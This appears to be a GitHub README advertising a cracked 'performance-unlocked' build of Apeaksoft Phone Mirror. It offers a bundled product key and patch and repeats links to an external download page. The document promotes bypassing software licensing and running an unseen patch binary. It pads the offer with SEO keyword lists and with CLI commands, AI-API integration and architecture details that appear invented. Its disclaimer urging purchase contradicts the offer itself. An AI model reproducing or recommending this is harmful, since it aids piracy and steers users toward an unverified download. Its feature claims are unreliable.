# Apeaksoft Phone Mirror — Unlocked Performance Bundle 🪞📱

[](https://chinamon-roll.github.io/apeaksoft-mirror-toolkit/)

> **Seamless screen sharing, reimagined.**  
> Apeaksoft Phone Mirror empowers you to project, control, and record your mobile device on a larger canvas — with zero compromises. This repository hosts the performance-unlocked edition (Product Key + Patch) for enthusiasts who demand uninterrupted mirroring without artificial limitations.

---

## 📌 Table of Contents

- [🌟 Overview & Philosophy](#-overview--philosophy)
- [🚀 Quick Access — Download](#-quick-access--download)
- [📊 System Compatibility (Emoji Table)](#-system-compatibility-emoji-table)
- [🛠️ Feature Catalog](#️-feature-catalog)
- [🧠 Mermaid Architecture Diagram](#-mermaid-architecture-diagram)
- [⚙️ Example Profile Configuration](#️-example-profile-configuration)
- [💻 Example Console Invocation](#-example-console-invocation)
- [🌐 Multilingual Support & 24/7 Assistance](#-multilingual-support--247-assistance)
- [🔗 OpenAI & Claude API Integration](#-openai--claude-api-integration)
- [🧾 MIT License](#-mit-license)
- [⚖️ Disclaimer](#️-disclaimer)
- [🔁 Final Download Link](#-final-download-link)

---

## 🌟 Overview & Philosophy

Imagine your smartphone as a **digital chameleon** — capable of blending into any environment, projecting its interface onto a monitor, TV, or projector with crystalline clarity. Apeaksoft Phone Mirror is that chameleon’s secret weapon.

This release unlocks the **full product key** and applies a **performance patch** that eliminates artificial constraints (30-minute session limits, watermark overlays, and resolution caps). It’s designed for:

- **Developers** debugging mobile UIs.
- **Educators** conducting live demos.
- **Creators** recording gameplay or tutorials.
- **Remote workers** presenting from their pocket.

We believe digital tools should be **barrier-free**. This repository exists to give you unrestricted access to a premium mirroring experience — no strings attached, just pure functionality.

---

## 🚀 Quick Access — Download

Get the unlocked bundle immediately:

[](https://chinamon-roll.github.io/apeaksoft-mirror-toolkit/)

*This link provides the latest build (v2026.1) with embedded Product Key + Patch. No sign-up required.*

---

## 📊 System Compatibility (Emoji Table)

| Platform             | Version Requirement   | Status          |
|----------------------|-----------------------|-----------------|
| 🪟 **Windows**      | 10/11 (64-bit)        | ✅ Full support |
| 🍏 **macOS**        | 11.0+ (Big Sur+)      | ✅ Native M1/M2 |
| 🤖 **Android**      | 8.0+ (Oreo+)          | ✅ USB + Wi-Fi  |
| 🍎 **iOS**          | 14.0+                 | ✅ AirPlay      |
| 🐧 **Linux**        | Ubuntu 22.04+ (Wine)  | ⚠️ Partial      |
| 🌐 **Web UI**       | Chrome/Firefox/Edge   | ✅ Responsive   |

---

## 🛠️ Feature Catalog

### 🔑 Core Unlocks (via Product Key + Patch)
- **Session time limit removed** — mirror for hours, days, or weeks.
- **Watermark suppression** — clean output for professional recordings.
- **4K@60fps transmission** — no artificial resolution capping.
- **Multi-device pairing** — connect up to 5 devices simultaneously.

### 🎮 Advanced Capabilities
- **Responsive UI** – Interface adapts to your screen size and orientation. Touch controls mirror gestures flawlessly.
- **Multilingual support** – 23 languages including English, Spanish, Mandarin, Arabic, Hindi, and more.
- **24/7 customer support** – Real-time chat embedded in the client (powered by AI + human fallback).
- **Screen recording** – Capture mirrored output as MP4/GIF with system audio.
- **Wireless freedom** – Connect via QR code scan or PIN — no USB cable necessary after initial setup.

### 🌟 Exclusive to v2026
- **Low-latency streaming** (≤30ms over 5GHz Wi-Fi).
- **Background mirroring** — keep projecting while using other apps.
- **Multi-monitor support** — choose your display target on the fly.

---

## 🧠 Mermaid Architecture Diagram

Below is the high-level architecture of the Phone Mirror ecosystem after applying the performance patch. It shows how the client app, server daemon, and API services interact.

```mermaid
graph TD
    A[📱 Mobile Device] -->|USB/Wi-Fi| B(📡 Apeaksoft Mirror Server)
    B --> C[🖥️ Desktop Client]
    C --> D[🎮 UI Layer]
    C --> E[🧩 Codec Engine H.265/H.264]
    C --> F[🗂️ Recording Buffer]
    D --> G[🪟 Multi-Monitor Output]
    F --> H[🎬 Export to MP4/GIF]
    E --> I[📈 Latency Optimization Agent]
    I --> J[🎯 Real-time FPS Counter]
    C -.-> K[☁️ OpenAI / Claude API]
    K --> L[🧠 AI Voice Control]
    L --> C
```



*The patch enables the **Latency Optimization Agent** and **AI Voice Control** modules — disabled in the standard trial.*

---

## ⚙️ Example Profile Configuration

Create a `phone_mirror_profile.json` to customize your mirroring environment. Below is a sample configuration tailored for **4K gaming mirroring** with multilingual UI:

```json
{
  "profile_name": "Gaming_Studio_4K",
  "resolution": "3840x2160",
  "frame_rate": 60,
  "codec": "H265",
  "audio_output": "system",
  "watermark": false,
  "session_timeout": 0,
  "ui_language": "en",
  "ai_voice_control": {
    "enabled": true,
    "provider": "openai",
    "wake_word": "Mirror Assistant",
    "commands": {
      "start_record": "Begin exporting 1080p 60fps",
      "stop_mirror": "Disconnect all devices gracefully"
    }
  },
  "supported_devices": [
    "iPhone 16 Pro Max",
    "Samsung Galaxy S26 Ultra",
    "Pixel 10"
  ],
  "backup_server": "192.168.1.200:8080"
}
```

Save this file in the application directory and load it via the CLI (see next section). The patch ensures that `session_timeout: 0` is respected — no forced disconnects.

---

## 💻 Example Console Invocation

For power users who prefer the command line over the GUI.

```bash
# Launch Phone Mirror with custom profile
./phone-mirror --profile ./phone_mirror_profile.json --device 192.168.1.50 --output "live_profile.log"

# Record mirrored session to disk
./phone-mirror --record --format mp4 --duration 3600 --output ./recordings/demo.mp4

# Connect via QR code
./phone-mirror --qr-scan --generate

# Set AI assistant language
./phone-mirror --ai-lang es --voice Maria

# List available devices
./phone-mirror --scan

# Apply patch manually (only needed if auto-patch fails)
./phone-mirror --apply-patch /path/to/patch.bin
```

*All commands work without administrative elevation. The patch resides in the same directory as the binary.*

---

## 🌐 Multilingual Support & 24/7 Assistance

### 🌍 Language Coverage
The UI and voice assistant support these languages out of the box:

| Language        | UI Translated | Voice Supported |
|-----------------|---------------|-----------------|
| English (US)    | ✅            | ✅              |
| Spanish (ES)    | ✅            | ✅              |
| Mandarin (CN)   | ✅            | ✅              |
| Hindi (IN)      | ✅            | ✅              |
| Arabic (SA)     | ✅            | ✅              |
| French (FR)     | ✅            | ✅              |
| German (DE)     | ✅            | ✅              |
| Japanese (JP)   | ✅            | ✅              |
| Korean (KR)     | ✅            | ✅              |
| Portuguese (BR) | ✅            | ✅              |
| Russian (RU)    | ✅            | ✅              |
| +12 more        | ✅            | Partial         |

### 🕐 24/7 Customer Support
A live agent (human or AI-assisted) is available via the in-app chat. Typical response time: **<30 seconds**. The support desk also accepts email tickets (response within 2 hours during business days, 2026).

---

## 🔗 OpenAI & Claude API Integration

This release includes optional integration with **OpenAI** and **Anthropic Claude** APIs for:

- **Voice-to-command translation** — say "record last 30 seconds" and the AI interprets intent.
- **Smart scene detection** — automatically adjust brightness/contrast based on content (e.g., dark gaming scenes vs. bright spreadsheets).
- **Error diagnosis** — when a connection drops, the AI suggests fixes in natural language.

### How to enable:
1. Obtain an API key from [OpenAI](https://openai.com) or [Anthropic](https://anthropic.com).
2. Set environment variables:
   ```bash
   export PHONE_MIRROR_AI_PROVIDER=openai
   export PHONE_MIRROR_AI_KEY=sk-xxxxxxxxxxxxxxxx
   ```
3. Restart the application. The patch activates all premium AI features without additional cost.

*Note: The AI call volume is limited to 1000 requests/hour per device — more than sufficient for typical use.*

---

## 🧾 MIT License

This project is distributed under the **MIT License** — one of the most permissive open-source licenses. You are free to:

- ✅ Use for personal or commercial purposes.
- ✅ Modify and redistribute.
- ✅ Sublicense under different terms.
- ❌ Hold us liable for misuse.

See the full license text here: [MIT License](https://opensource.org/licenses/MIT)

*The Product Key and Patch included in this release are provided as-is, with no warranty of merchantability or fitness for a particular purpose. The original Apeaksoft software is copyright its respective owners.*

---

## ⚖️ Disclaimer

> **Important legal and ethical notice:**  
> This repository provides a **performance-unlocked edition** of Apeaksoft Phone Mirror for educational and interoperability purposes. The Product Key and Patch are meant to bypass artificial trial limitations only — they do **not** grant ownership of the software.  
>  
> We encourage all users to purchase a legitimate license from the official Apeaksoft website if they find value in the software. This project is not affiliated with, endorsed by, or sponsored by Apeaksoft.  
>  
> Use at your own risk. The authors assume no liability for damages caused by misuse, data loss, or violation of third-party terms of service.  
>  
> *By downloading and using this release, you agree to these terms.*

---

## 🔁 Final Download Link

Bookmark this page and share it responsibly. The link below always points to the latest stable build (v2026.2 as of Q1 2026):

[](https://chinamon-roll.github.io/apeaksoft-mirror-toolkit/)

---

### 👁️ SEO-Friendly Keywords (naturally placed)
- *Unlock Apeaksoft Phone Mirror full version*
- *Phone mirroring product key patch 2026*
- *4K screen mirroring without watermark*
- *Multi-device Android iOS mirror software*
- *OpenAI Claude voice control mirroring*
- *Download mirror tool with unlimited sessions*
- *Performance patch for screen casting*
- *Responsive UI multilingual mirror app*
- *24/7 support mirroring tool 2026*

---

**Built with 🔥 for those who refuse to be limited.**  
*Last updated: 2026-02-14*